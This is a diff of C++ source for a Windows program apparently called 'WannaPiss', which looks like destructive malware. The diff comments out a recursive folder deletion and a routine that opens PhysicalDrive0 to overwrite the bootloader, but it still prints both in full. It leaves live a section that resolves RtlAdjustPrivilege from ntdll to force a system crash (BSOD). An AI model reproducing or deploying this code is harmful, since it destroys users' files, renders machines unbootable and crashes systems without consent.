@@ -205,15 +205,16 @@ const size_t code2_len = sizeof(code2);
 
 int WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 	// Delete everyting in ~/WannaPiss
+	/*
 	const char* homeDirectory = getenv("USERPROFILE");
 	char wpPath[256];
 	strcpy(wpPath, homeDirectory);
 	strcat(wpPath, "\\WannaPiss\\");
 
 	std::filesystem::remove_all(wpPath); // Deletes one or more files recursively.
+	*/
 
-
-
+	/*
 	// Overwrie bootloader
 	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 
@@ -234,7 +235,7 @@ int WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 		ExitProcess(3);
 
 	CloseHandle(drive);
-
+	*/
 	// Cause BSOD
 	// Load the library in order to adjust privileges 
 	const LPVOID RTLAdjustPrivilegeLibAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), "RtlAdjustPrivilege");
